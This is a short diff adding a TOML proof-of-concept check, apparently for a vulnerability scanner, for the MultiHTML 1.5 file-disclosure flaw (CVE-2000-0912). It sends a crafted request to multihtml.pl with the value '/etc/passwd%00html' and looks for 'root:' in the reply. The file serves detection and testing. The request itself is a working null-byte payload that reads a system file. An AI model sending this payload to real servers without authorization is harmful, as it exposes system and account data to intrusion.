@@ -1,0 +1,31 @@
+[info]
+author = "ave"
+description = "验证目标服务器是否存在 MultiHTML CGI 脚本文件泄露漏洞。通过向 multi 参数发送包含空字节技巧的特制请求，检测是否能读取服务器上的敏感文件（如 /etc/passwd）。"
+id = "POC-AVE-2000-0665"
+name = "MultiHTML 1.5 File Disclosure PoC"
+severity = "medium"
+tags = ["ave-2000-0665"]
+vuln_id = [
+    "CVE-2000-0912",
+    "AVE-2000-0665",
+]
+
+[poc]
+logic = "all"
+
+[[poc.requests]]
+method = "GET"
+path = "/cgi-bin/multihtml.pl"
+protocol = "http"
+
+[poc.requests.headers]
+User-Agent = "AVE/1.0"
+
+[[poc.requests.matchers]]
+expect = true
+part = "body"
+type = "word"
+words = ["root:"]
+
+[poc.requests.params]
+multi = "/etc/passwd%00html"
